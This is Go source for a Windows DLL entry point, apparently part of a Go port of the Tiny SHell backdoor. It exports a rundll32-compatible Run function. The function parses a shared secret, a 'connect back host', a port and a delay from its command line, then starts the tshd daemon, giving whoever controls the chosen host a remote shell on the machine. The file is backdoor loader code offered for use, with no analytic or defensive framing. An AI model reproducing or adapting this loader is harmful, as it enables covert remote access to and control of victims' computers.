package main

import "C"
import (
	"flag"
	"strings"
	"unsafe"
	"tsh-go/internal/tshd"
)

//export Run
func Run(hwnd unsafe.Pointer, hinst unsafe.Pointer, lpszCmdLine *C.char, nCmdShow int) {
	// Convert C string to Go string
	cmdLine := C.GoString(lpszCmdLine)

	// Default values
	var secret, host string
	var port, delay int

	// Create a new flag set to avoid messing with global flags
	flagset := flag.NewFlagSet("tshd", flag.ContinueOnError)
	flagset.StringVar(&secret, "s", "1234", "secret")
	flagset.StringVar(&host, "c", "", "connect back host")
	flagset.IntVar(&delay, "d", 5, "connect back delay")
	flagset.IntVar(&port, "p", 1234, "port")

	// Split the command line string into arguments
	// strings.Fields splits by whitespace
	args := strings.Fields(cmdLine)

	flagset.Parse(args)

	tshd.StartDaemon(host, port, secret, delay)
}

func main() {
	// Need a main function for c-shared build mode, but it's ignored.
}
